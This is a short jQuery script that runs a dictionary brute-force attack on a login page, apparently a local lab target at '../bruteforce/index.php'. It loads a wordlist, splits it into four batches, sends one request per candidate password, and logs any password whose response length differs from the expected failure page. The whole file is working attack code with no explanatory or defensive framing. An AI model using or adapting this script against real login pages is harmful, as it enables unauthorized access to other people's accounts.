var passwords = [];
var password = '';
var numberOfAttackFailed = 0;
var quarter, firstQuarter, secondQuarter, thirdQuarter, fourthQuarter, result = [];

  // $.get('./dico.txt', function(data){passwords = data.split(/\n/);});

  $.ajax({
    type: 'GET',
    async: false,
    dataType: 'text',
    url: '../data/dico.txt',
    success: function (data){
      passwords = data.split(/\n/);
    },
  });

quarter = Math.floor(passwords.length / 4);
firstQuarter = passwords.splice(0, quarter);
secondQuarter = passwords.splice(0, quarter);
thirdQuarter = passwords.splice(0, quarter);
fourthQuarter = passwords.splice(0, quarter);

function ajaxAttack(array){
  array.forEach(function(value){


    var data = {password: value};
    console.log('attacking!');
    $.ajax({
      type: 'GET',
      url: '../bruteforce/index.php',
      data: data,
      success: function(data){
        if (data.length != 222){
          console.log(value);
          result.push(data);
        }
      },
      error: function(){
        console.log('FAILED');
        numberOfAttackFailed++;
      }
    });

  });

}

$('#first-quarter').on('click', function(){
  ajaxAttack(firstQuarter);
});

$('#second-quarter').on('click', function(){
  ajaxAttack(secondQuarter);
});

$('#third-quarter').on('click', function(){
  ajaxAttack(thirdQuarter);
});

$('#fourth-quarter').on('click', function(){
  ajaxAttack(fourthQuarter);
});
